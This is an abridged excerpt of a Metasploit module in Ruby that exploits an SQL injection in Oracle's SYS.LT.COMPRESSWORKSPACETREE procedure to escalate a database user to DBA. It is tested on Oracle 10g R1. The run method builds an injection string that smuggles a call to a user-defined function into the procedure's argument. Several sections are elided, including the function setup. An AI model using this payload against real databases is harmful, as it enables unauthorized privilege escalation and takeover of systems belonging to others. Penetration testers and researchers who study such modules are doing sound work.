##
# $Id: lt_COMPRESSWORKSPACETREE.rb
##
...
class Metasploit3 < Msf::Auxiliary
	...
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'SQL Injection in  SYS.LT.COMPRESSWORKSPACETREE Procedure.',
			'Description'    => %q{
					This module will escalate a Oracle DB user to DBA by exploiting an sql injection bug in
					SYS.LT.COMPRESSWORKSPACETREE procedure. Tested on Oracle 10g R1.
			},
	...
	def run
		...
		exploiting ="BEGIN SYS.LT.COMPRESSWORKSPACETREE('X'' and #{datastore['USER']}.#{name}()=''X');END;"
